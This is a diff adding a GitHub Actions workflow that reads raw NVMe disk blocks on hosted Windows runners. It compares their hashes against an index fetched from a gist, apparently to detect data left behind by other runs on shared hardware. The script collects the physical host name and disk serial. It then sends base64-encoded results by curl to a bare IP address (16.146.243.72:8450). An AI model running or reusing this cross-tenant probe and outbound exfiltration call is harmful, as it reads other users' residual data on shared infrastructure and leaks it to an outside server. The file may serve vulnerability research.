@@ -1,0 +1,53 @@
+name: Public-A exact private-B NVMe remanence reader
+
+on:
+  workflow_dispatch:
+
+permissions: {}
+
+jobs:
+  read:
+    strategy:
+      fail-fast: false
+      max-parallel: 16
+      matrix:
+        sample: [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15]
+    runs-on: windows-latest
+    timeout-minutes: 8
+    steps:
+      - name: Hash exact private-B manifest offsets only
+        shell: pwsh
+        run: |
+          $ErrorActionPreference = 'Continue'
+          $hostName = (Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Virtual Machine\Guest\Parameters').PhysicalHostNameFullyQualified
+          $disk = Get-Disk | Where-Object FriendlyName -like '*NVMe Direct*' | Select-Object -First 1
+          if (-not $disk) {
+            $verdict = @{host=$hostName; serial='none'; run=$env:GITHUB_RUN_ID; sample='${{ matrix.sample }}'; indexed=0; checked=0; matches=@()}
+          } else {
+            $serial = ($disk.SerialNumber -replace '[^0-9A-Fa-f_]', '').Trim('_')
+            $index = @()
+            try {
+              $index = Invoke-RestMethod -TimeoutSec 20 -Uri "https://gist.githubusercontent.com/fdzdev/cb5385ff82eb8fbc16334a24be5b40ab/raw/remw-index.json?v=$env:GITHUB_RUN_ID-${{ matrix.sample }}"
+            } catch {}
+            $verdict = @{host=$hostName; serial=$serial; run=$env:GITHUB_RUN_ID; sample='${{ matrix.sample }}'; indexed=$index.Count; checked=0; matches=@()}
+            $sha = [System.Security.Cryptography.SHA256]::Create()
+            foreach ($manifest in $index) {
+              if ($manifest.serial -ne $serial) { continue }
+              $verdict.checked++
+              $raw = [System.IO.File]::Open("\\.\PHYSICALDRIVE$($disk.Number)", 'Open', 'Read', [System.IO.FileShare]::ReadWrite)
+              $found = 0
+              for ($block = 0; $block -lt $manifest.count; $block++) {
+                $raw.Seek([int64]$manifest.base + $block * 4096, 'Begin') | Out-Null
+                $buf = New-Object byte[] 4096
+                $raw.Read($buf, 0, 4096) | Out-Null
+                $actual = ([BitConverter]::ToString($sha.ComputeHash($buf)) -replace '-', '').ToLower()
+                if ($actual -eq $manifest.hashes[$block]) { $found++ }
+              }
+              $raw.Close()
+              $verdict.matches += @{seed_run=$manifest.run; found=$found; of=$manifest.count}
+            }
+          }
+          $result = $verdict | ConvertTo-Json -Compress -Depth 4
+          Write-Output "VERDICTJSON $result"
+          $encoded = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($result)).Replace('+','-').Replace('/','_')
+          curl.exe -s "http://16.146.243.72:8450/MYTH_REMW_A_READ?d=$encoded" | Out-Null
